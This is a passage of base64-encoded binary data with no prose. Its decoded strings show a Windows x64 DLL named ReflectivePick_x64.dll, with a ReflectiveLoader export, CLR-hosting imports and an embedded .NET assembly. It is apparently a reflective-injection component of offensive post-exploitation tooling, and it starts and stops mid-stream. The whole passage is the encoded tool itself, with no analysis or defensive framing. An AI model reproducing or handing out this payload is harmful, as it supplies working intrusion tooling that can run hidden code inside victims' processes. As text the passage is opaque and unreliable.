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VzcwAAHgJHZXRNb2R1bGVIYW5kbGVXAAAfAUV4aXRQcm9jZXNzAHwEU2V0SGFuZGxlQ291bnQAAGsCR2V0U3RkSGFuZGxlAADrAkluaXRpYWxpemVDcml0aWNhbFNlY3Rpb25BbmRTcGluQ291bnQA+gFHZXRGaWxlVHlwZQBqAkdldFN0YXJ0dXBJbmZvVwDSAERlbGV0ZUNyaXRpY2FsU2VjdGlvbgAZAkdldE1vZHVsZUZpbGVOYW1lQQAAZwFGcmVlRW52aXJvbm1lbnRTdHJpbmdzVwAgBVdpZGVDaGFyVG9NdWx0aUJ5dGUA4QFHZXRFbnZpcm9ubWVudFN0cmluZ3NXAADbAkhlYXBTZXRJbmZvcm1hdGlvbgAAqgJHZXRWZXJzaW9uAADVAkhlYXBDcmVhdGUAANYCSGVhcERlc3Ryb3kAqQNRdWVyeVBlcmZvcm1hbmNlQ291bnRlcgCaAkdldFRpY2tDb3VudAAAxwFHZXRDdXJyZW50UHJvY2Vzc0lkAIACR2V0U3lzdGVtVGltZUFzRmlsZVRpbWUA3AJIZWFwU2l6ZQAANAVXcml0ZUZpbGUAGgJHZXRNb2R1bGVGaWxlTmFtZVcAAHgBR2V0Q1BJbmZvAG4BR2V0QUNQAAA+AkdldE9FTUNQAAAMA0lzVmFsaWRDb2RlUGFnZQBpA011bHRpQnl0ZVRvV2lkZUNoYXIA2gJIZWFwUmVBbGxvYwBBA0xvYWRMaWJyYXJ5VwAAoAFHZXRDb25zb2xlQ1AAALIBR2V0Q29uc29sZU1vZGUAAF0BRmx1c2hGaWxlQnVmZmVycwAALwNMQ01hcFN0cmluZ1cAAHACR2V0U3RyaW5nVHlwZVcAAFIAQ2xvc2VIYW5kbGUAMwVXcml0ZUNvbnNvbGVXAHQEU2V0RmlsZVBvaW50ZXIAAJQEU2V0U3RkSGFuZGxlAACPAENyZWF0ZUZpbGVXAGAFbHN0cmxlbkEAAEoDTG9jYWxGcmVlAEtFUk5FTDMyLmRsbAAAAAAAAAAAAAAAAAAAAAC/dglVAAAAAJxHAQABAAAAAgAAAAIAAACIRwEAkEcBAJhHAQAwEAAARBUAALNHAQDERwEAAAABAFJlZmxlY3RpdmVQaWNrX3g2NC5kbGwAUmVmbGVjdGl2ZUxvYWRlcgBWb2lkRnVuYwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACIAwGAAQAAAAAAAAAAAAAALj9BVmJhZF9hbGxvY0BzdGRAQAAAAAAAiAMBgAEAAAAAAAAAAAAAAC4/QVZleGNlcHRpb25Ac3RkQEAAAAAAADKi3y2ZKwAAzV0g0mbU//+IAwGAAQAAAAAAAAAAAAAALj9BVnR5cGVfaW5mb0BAAMCxAYABAAAAAAAAAAAAAADAsQGAAQAAAAEBAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAWAAAAAgAAAAIAAAADAAAAAgAAAAQAAAAYAAAABQAAAA0AAAAGAAAACQAAAAcAAAAMAAAACAAAAAwAAAAJAAAADAAAAAoAAAAHAAAACwAAAAgAAAAMAAAAFgAAAA0AAAAWAAAADwAAAAIAAAAQAAAADQAAABEAAAASAAAAEgAAAAIAAAAhAAAADQAAADUAAAACAAAAQQAAAA0AAABDAAAAAgAAAFAAAAARAAAAUgAAAA0AAABTAAAADQAAAFcAAAAWAAAAWQAAAAsAAABsAAAADQAAAG0AAAAgAAAAcAAAABwAAAByAAAACQAAAAYAAAAWAAAAgAAAAAoAAACBAAAACgAAAIIAAAAJAAAAgwAAABYAAACEAAAADQAAAJEAAAApAAAAngAAAA0AAAChAAAAAgAAAKQAAAALAAAApwAAAA0AAAC3AAAAEQAAAM4AAAACAAAA1wAAAAsAAAAYBwAADAAAAAwAAAAIAAAA/////wAAAAAAAAAAAAAAAP//////////gAoAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAAAAAAAAAHBPAAAAAAAASAAAAAIABQBAJgAAwCcAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAGzADAK0AAAABAAARAHMOAAAGCigQAAAKCwcUbxEAAAoABgcoEgAACgwACG8TAAAKAAhvFAAACg0ACW8VAAAKAm8WAAAKAAlvFQAAChZvFwAAChgXbxgAAAoACW8VAAAKcgEAAHBvGQAACgAJbxoAAAomAN4SCRT+ARMGEQYtBwlvGwAACgDcAADeEggU/gETBhEGLQcIbxsAAAoA3AAGbxwAAAp0BAAAAm8aAAAGEwQRBBMFKwARBSoAAAABHAAAAgAsAD1pABIAAAAAAgAdAGJ/ABIAAAAAHgIoHQAACioTMAEADAAAAAIAABEAAnsBAAAECisABioTMAEACwAAAAMAABEAchkAAHAKKwAGKgATMAIADQAAAAQAABEAFxZzHgAACgorAAYqAAAAEzABAAwAAAAFAAARAAJ7AgAABAorAAYqEzABABAAAAAGAAARACgfAAAKbyAAAAoKKwAGKhMwAQAQAAAABgAAEQAoHwAACm8hAAAKCisABioyAHIzAABwcyIAAAp6MgByrAEAcHMiAAAKehIAKwAqEgArACoSACsAKnoCKCMAAAp9AQAABAJzDwAABn0CAAAEAigkAAAKACqCAnM7AAAGfQQAAAQCKCUAAAoAAAJzJgAACn0DAAAEACo+AAJ7AwAABAVvJwAACiYqTgACewMAAARyIwMAcG8nAAAKJipmAAJ7AwAABAVyIwMAcCgoAAAKbycAAAomKj4AAnsDAAAEA28nAAAKJipmAAJ7AwAABHInAwBwAygoAAAKbykAAAomKmYAAnsDAAAEcjcDAHADKCgAAApvKQAACiYqPgACewMAAAQDbykAAAomKmYAAnsDAAAEckcDAHADKCgAAApvKQAACiYqZgACewMAAARyWwMAcAMoKAAACm8pAAAKJioSACsAKhMwAQARAAAAAwAAEQACewMAAARvKgAACgorAAYqMgBybwMAcHMiAAAKejIActIEAHBzIgAACnoyAHJHBgBwcyIAAAp6MgByxgcAcHMiAAAKegAAABMwAQAMAAAABwAAEQACewQAAAQKKwAGKjIAckUJAHBzIgAACnoyAHKsCgBwcyIAAAp6AAATMAEADAAAAAgAABEAAnsJAAAECisABiomAAIDfQkAAAQqAAATMAEADAAAAAkAABEAAnsMAAAECisABiomAAIDfQwAAAQqAAATMAEADAAAAAoAA